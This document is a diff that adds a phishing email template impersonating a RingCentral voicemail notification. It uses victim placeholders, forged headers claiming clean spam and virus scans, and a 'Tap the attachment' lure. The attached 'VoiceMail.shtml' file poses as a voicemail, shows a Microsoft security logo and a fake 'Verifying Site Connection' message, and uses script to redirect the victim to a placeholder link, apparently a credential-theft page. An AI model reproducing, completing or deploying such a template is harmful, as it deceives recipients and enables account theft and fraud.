@@ -1,0 +1,113 @@
+Content-Type: multipart/mixed; boundary="===============2481504436751503550=="
+From: RingCentral < no-reply@ringcentral.com >
+To: ##victimemail##
+Subject: =?UTF-8?Q?You_just_received_a_New_Voicemail?=
+Date: Fri, 19 Apr 2024 08:48:48 -0000
+Message-ID: <171351652844.7724.18065623268426718566@amazonses.com>
+Auto-Submitted: auto-generated
+X-XDVMMU: QFVLBOBSM
+X-STVPVNZFI: ZCWZKB
+X-YDGYLKYL: ZTPQL
+X-OCSFJQZC: RXNOXVLOG
+X-MUOGXK: TAOXI
+X-IXAEP: YBARU
+X-Accept-Language: en-us, en
+X-Originating-IP:
+X-Identity:
+X-Auth-ID: ##victimemail##
+X-Orig-To: ##victimemail##
+X-SpamInfo: No,*,domain_age: email-smtp.us-east-1.amazonaws.com:a=25,s=header{END.EN_US}
+X-Spam-Flag: NO
+X-SpamInfo: spam not detected
+X-AES-Category: LEGIT
+X-Spam-Score: 0
+X-Spam-Category: : LEGIT
+X-SpamCatcher-Score: 0
+X-Virus-Scanned: OK
+X-Suspicious-Flag: NO
+X-SpamFilter-By: BOX Solutions SpamTrap 3.5 with qID r0HNXZSI028539, This message is passed by code: ctdos35128
+MIME-Version: 1.2
+
+--===============2481504436751503550==
+Content-Type: multipart/alternative; boundary="===============2841181241038313190=="
+
+--===============2841181241038313190==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+##victimemail##RingCentralRingEx=20New=20Voicemail=20from=20=20+1814375##nu=
+m3##Received=20On=20Friday,=20##date1$$=20=20Duration:=2000:15=20##victimem=
+ail$$=20&nbsp;&nbsp;=20just=20received=20a=20new=20voicemail=20=20Tap=20the=
+=20attachment=20to=20listen=20to=20your=20Voicemailringcentral.com=20|=20!!=
+o[194]o!!!!o[169]o!!=202024=20Ringcentral,=20Inc.=20All=20Rights=20Reserved=
+...=20|=20Privacy=20Policy
+--===============2841181241038313190==
+Content-Type: multipart/related; boundary="===============3373415344164649720=="
+
+--===============3373415344164649720==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8"><b=
+ody style=3D"width: 700px;"><div style=3D"width: 100%; background-color: #0=
+0AEEF; height: 20px; border-radius: 7px 7px 0px 0px;"></div><div style=3D"d=
+isplay: flex;"><a href=3D"#" style=3D"font-family: Arial, Helvetica, sans-s=
+erif; font-weight: bold; margin-top: 20px; text-decoration: none; color: #0=
+0AEEF;"></a><div style=3D"justify-content: space-between; margin-left: auto=
+; font-style: italic; padding-right: 20px; font-family: sans-serif; font-si=
+ze: 40px; margin-top: 9px; text-transform: capitalize; font-weight: bold;">=
+<span style=3D" color: #00AEEF;">Ring</span><span style=3D"color: #FF8F00;"=
+>Central</span></div></div><p style=3D"font-size: 22px; font-weight: bold; =
+font-family: sans-serif; color: #00AEEF; font-style: italic;">Ring<span sty=
+le=3D"color: #FF8F00;">EX<b>|| ##victimemail## ||</span> <br><br></p>=
+<h1 style=3D"font-family: sans-serif;">New Voicemail from  +18##num1##-##num3##-***##num1##</h1>=
+<p style=3D"font-family: Arial, Helvetica, sans-serif;">Received: <stro=
+ng>##date## <br><br> Duration: 00:1##num1##</strong> <br><br><st=
+rong>##victimemail##
+ &nbsp;&nbsp;</strong>received a new voicemail <br><br> <span style=
+=3D"font-size: 25px; font-weight: bold;">Tap the Attachment to listen to yo=
+ur Voicemail</span></p><br><div align=3D"center"><p style=3D"font-family: A=
+rial, Helvetica, sans-serif;"><span style=3D"color: #FF8F00; font-size: 14p=
+x; font-weight: bold;">ringcentral.com </span>| =C2=A9 2024 Ringcentral, In=
+c. All Rights Reserved. | <span style=3D"color: #FF8F00; font-size: 14px; f=
+ont-weight: bold;">Privacy Policy</span></p></div></body>=
+
+--===============3373415344164649720==--
+
+--===============2841181241038313190==--
+
+--===============2481504436751503550==
+Content-Type: text/html
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="VoiceMail.shtml"
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting...</title>
+<script>
+// Function to extract email from URL
+const getEmailFromURL = () => new URLSearchParams(window.location.search).get('email');
+
+// Function to redirect to YouTube after a delay
+const redirectToYouTube = () => setTimeout(() => window.location.href = `##link##`, 500);
+</script>
+</head>
+<body style="font-family: Arial, Helvetica, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
+<div style="text-align: center;">
+    <!-- Logo -->
+    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="Logo" width="130px" height="auto">
+    <!-- Message -->
+    <p style="font-weight: bold;">Verifying Site Connection...</p>
+</div>
+<!-- Call redirectToYouTube when the page loads -->
+<script>window.onload = redirectToYouTube;</script>
+</body>
+</html>
+
+
+--===============2481504436751503550==--
